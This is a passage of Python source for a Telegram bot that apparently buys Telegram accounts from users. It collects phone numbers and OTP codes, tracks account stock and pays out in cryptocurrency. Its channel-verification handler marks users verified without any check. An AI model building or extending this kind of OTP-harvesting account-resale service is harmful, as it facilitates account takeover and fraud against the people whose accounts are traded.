            await update.callback_query.answer()
            
            from database import get_db_session, close_db_session
            from database.operations import SystemSettingsService, TelegramAccountService
            
            db = get_db_session()
            try:
                # Get real-time metrics
                total_accounts = db.query(TelegramAccount).count()
                active_accounts = db.query(TelegramAccount).filter(TelegramAccount.status == AccountStatus.AVAILABLE).count()
                frozen_accounts = db.query(TelegramAccount).filter(TelegramAccount.status == AccountStatus.FROZEN).count()
                sold_accounts = db.query(TelegramAccount).filter(TelegramAccount.status == AccountStatus.SOLD).count()
                
                # Calculate percentages
                active_percentage = (active_accounts / max(total_accounts, 1)) * 100
                
                capacity_text = f"""
📊 **Real-Time System Capacity**

**📈 Account Statistics:**
• **Total Accounts:** {total_accounts}
• **Active & Available:** {active_accounts} ({active_percentage:.1f}%)
• **Frozen/Banned:** {frozen_accounts}
• **Successfully Sold:** {sold_accounts}

**🔥 Server Status:**
• **Database:** ✅ Connected
• **Telegram API:** ✅ Active
• **OTP Service:** ✅ Operational
• **Security System:** ✅ Enabled

**📊 Capacity Metrics:**
• **Frozen Accounts:** {frozen_accounts} accounts
• **Success Rate:** {((sold_accounts / max(total_accounts, 1)) * 100):.1f}%
• **System Load:** {"🟢 Normal" if active_accounts < 50 else "🟡 High" if active_accounts < 100 else "🔴 Critical"}

*Last updated: Real-time*
                """
                
                keyboard = [[InlineKeyboardButton("🔄 Refresh", callback_data="system_capacity")],
                           [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
                
                await update.callback_query.edit_message_text(
                    capacity_text,
                    parse_mode='Markdown',
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                
            finally:
                close_db_session(db)
                
        except Exception as e:
            logger.error(f"Error in system capacity: {e}")
            await update.callback_query.edit_message_text("❌ Error loading system capacity. Please try again.")

    # Status Check Handler - Real-time bot and user status  
    async def handle_status_check(update, context):
        """Show real-time bot status and user information."""
        try:
            await update.callback_query.answer()
            user = update.effective_user
            
            from database import get_db_session, close_db_session
            from database.operations import UserService, ActivityLogService
            import datetime
            
            db = get_db_session()
            try:
                # Get user information
                db_user = UserService.get_user_by_telegram_id(db, user.id)
                if not db_user:
                    await update.callback_query.edit_message_text("❌ User not found. Please restart with /start")
                    return
                
                # Get recent activity
                recent_activities = ActivityLogService.get_user_activity(db, db_user.id, limit=5)
                
                # Calculate uptime (placeholder - replace with actual bot start time)
                uptime_hours = 24  # This should be calculated from actual bot start time
                
                # Escape special markdown characters
                username_safe = (user.username or 'Not set').replace('_', r'\_').replace('*', r'\*').replace('[', r'\[').replace('`', r'\`')
                
                status_text = f"""📊 **Real-Time Status Dashboard**

**👤 Your Account:**
• **User ID:** `{user.id}`
• **Username:** @{username_safe}
• **Status:** {"✅ Verified" if db_user.verification_completed else "⏳ Pending"}
• **Balance:** `${db_user.balance:.2f}`
• **Accounts Sold:** {db_user.total_accounts_sold}
• **Total Earnings:** `${db_user.total_earnings:.2f}`

**🤖 Bot Status:**
• **Uptime:** {uptime_hours} hours
• **Connection:** ✅ Online
• **Last Update:** {datetime.datetime.now().strftime("%H:%M:%S")}
• **Version:** 2.0 (Real API)

**📈 Recent Activity:**"""
                
                if recent_activities:
                    for activity in recent_activities:
                        # Escape special characters in activity text
                        action_safe = activity.action_type.replace('_', r'\_').replace('*', r'\*').replace('[', r'\[').replace('`', r'\`')
                        status_text += f"\n• {action_safe}: {activity.created_at.strftime('%H:%M')}"
                else:
                    status_text += "\n• No recent activity"
                
                status_text += "\n*Status updated in real-time*"
                
                keyboard = [[InlineKeyboardButton("🔄 Refresh Status", callback_data="status")],
                           [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
                
                await update.callback_query.edit_message_text(
                    status_text,
                    parse_mode='Markdown',
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                
            finally:
                close_db_session(db)
                
        except Exception as e:
            logger.error(f"Error in status check: {e}")
            await update.callback_query.edit_message_text("❌ Error loading status. Please try again.")

    # Add verify channels handler - THIS IS THE MISSING PIECE!
    async def handle_verify_channels_real(update, context):
        """Handle channel verification in real handlers."""
        user = update.effective_user
        print(f"🎉🎉🎉 REAL HANDLERS: verify_channels called for user {user.id} 🎉🎉🎉")
        
        try:
            # Answer callback query
            await update.callback_query.answer("✅ Verification completed!")
            
            # Import verification completion from main handlers
            from database.operations import UserService
            from database import get_db_session, close_db_session
            from database.models import UserStatus
            
            # Mark user as verified
            db = get_db_session()
            try:
                db_user = UserService.get_user_by_telegram_id(db, user.id)
                if db_user:
                    db_user.verification_completed = True
                    db_user.captcha_completed = True
                    db_user.channels_joined = True
                    db_user.status = UserStatus.ACTIVE
                    db.commit()
                    print(f"🎉 REAL: Marked user {user.id} as verified")
            finally:
                close_db_session(db)
            
            # Show main menu directly
            await show_real_main_menu(update, context)
            print(f"🎉 REAL: Showed main menu for user {user.id}")
            
        except Exception as e:
            print(f"🎉 REAL: Error in verification: {e}")
            await update.callback_query.edit_message_text("❌ Verification error. Please try again.")


    
    application.add_handler(CallbackQueryHandler(handle_verify_channels_real, pattern='^verify_channels$'))
    
    # Add balance handler
    application.add_handler(CallbackQueryHandler(handle_check_balance, pattern='^check_balance$'))
    
    # Add admin panel handler - route to admin_handlers
    async def handle_admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Route admin panel clicks to the admin handlers."""
        try:
            from handlers.admin_handlers import handle_admin_panel
            await handle_admin_panel(update, context)
        except Exception as e:
            logger.error(f"Error in admin panel handler: {e}")
            if update.callback_query:
                await update.callback_query.answer("❌ Error loading admin panel", show_alert=True)
    
    application.add_handler(CallbackQueryHandler(handle_admin_panel_callback, pattern='^admin_panel$'))
    
    # Add withdrawal menu handler
    application.add_handler(CallbackQueryHandler(handle_withdraw_menu, pattern='^withdraw_menu$'))
    application.add_handler(CallbackQueryHandler(handle_withdrawal_history, pattern='^withdrawal_history$'))
    
    # Add withdrawal buttons as standalone handlers (work even when not in conversation)
    application.add_handler(CallbackQueryHandler(handle_withdraw_trx, pattern='^withdraw_trx$'))
    application.add_handler(CallbackQueryHandler(handle_withdraw_usdt, pattern='^withdraw_usdt$'))
    application.add_handler(CallbackQueryHandler(handle_withdraw_binance, pattern='^withdraw_binance$'))
    
    # Add cancel withdrawal function for conversation fallback
    async def cancel_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel withdrawal process and return to main menu."""
        try:
            if update.callback_query:
                await update.callback_query.answer("❌ Withdrawal cancelled")
                
                # Check which menu to show based on callback data
                if update.callback_query.data == 'withdraw_menu':
                    # Go back to withdrawal menu
                    await handle_withdraw_menu(update, context)
                elif update.callback_query.data == 'main_menu':
                    # Go back to main menu
                    await show_real_main_menu(update, context)
            else:
                # Handle text messages during withdrawal conversation
                await update.message.reply_text(
                    "❌ Withdrawal process cancelled. Please use the menu buttons to start a new withdrawal.",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"),
                        InlineKeyboardButton("💸 Withdrawal Menu", callback_data="withdraw_menu")
                    ]])
                )
        except Exception as e:
            logger.error(f"Error in cancel_withdrawal: {e}")
        
        return ConversationHandler.END
    
    # ===========================================
    # Withdrawal and Selling ConversationHandlers already registered at top
    # ===========================================
    
    
    application.add_handler(CallbackQueryHandler(handle_language_menu, pattern='^language_menu$'))
    
    # Add language selection handlers
    application.add_handler(CallbackQueryHandler(handle_language_selection, pattern='^lang_(en|es|fr|de|ru|zh|hi|ar)$'))
    
    application.add_handler(CallbackQueryHandler(handle_system_capacity, pattern='^system_capacity$'))
    application.add_handler(CallbackQueryHandler(handle_status_check, pattern='^status$'))
    
    # Add captcha verification handlers
    application.add_handler(CallbackQueryHandler(handle_start_verification, pattern='^start_verification$'))
    application.add_handler(CallbackQueryHandler(handle_start_verification, pattern='^new_captcha$'))  # Same function for new captcha
    
    # Add message handler for CAPTCHA answers with proper isolation
    async def isolated_captcha_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle CAPTCHA answers only when user is in verification process."""
        # Only handle captcha if user is actually in verification process
        if context.user_data.get('captcha_answer') and context.user_data.get('verification_step') == 1:
            return await handle_captcha_answer(update, context)
        # Otherwise ignore - let ConversationHandlers process the message
        return
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, isolated_captcha_handler))
    
    # ===========================================
    # ADMIN PANEL HANDLERS (MUST BE BEFORE GENERAL CALLBACK HANDLER)
    # ===========================================
    
    # Add admin panel callback handler FIRST (before other handlers)
    from handlers.admin_panel_working import (
        admin_panel_main, 
        get_admin_mailing_conversation_handler
    )
    
    # Register admin panel main callback
    # Admin handlers already registered at top with highest priority
    
    # ===========================================
    # GENERAL MESSAGE HANDLER (MUST BE AFTER CONVERSATIONHANDLERS!)
    # ===========================================
    # This catches phone numbers, OTPs, and captcha answers
    # Placed HERE so ConversationHandlers get priority
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, ultra_aggressive_captcha_answer_real))
    logger.info("✅ General message handler registered (after ConversationHandlers)")
    
    # ===========================================
    # GENERAL BUTTON CALLBACK HANDLER (MUST BE LAST)
    # ===========================================
    
    # Add the general button callback handler for approval/rejection buttons
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # ===========================================
    # CLEAN HANDLERS - PROFESSIONAL CODE STRUCTURE
    # ===========================================
    
    # ===========================================
    # NEW COMPREHENSIVE FEATURES
    # ===========================================
    
    # Setup Leader Panel Handlers
    try:
        from handlers.leader_handlers import setup_leader_handlers
        setup_leader_handlers(application)
        logger.info("Leader panel handlers loaded successfully")
    except Exception as e:
        logger.error(f"Failed to load leader handlers: {e}")
    
    # Setup Analytics Dashboard
    try:
        from handlers.analytics_handlers import setup_analytics_handlers
        setup_analytics_handlers(application)
        logger.info("Analytics dashboard handlers loaded successfully")
    except Exception as e:
        logger.error(f"Failed to load analytics handlers: {e}")
    
    logger.info("Real handlers set up successfully with comprehensive admin panel, leader system, and analytics dashboard")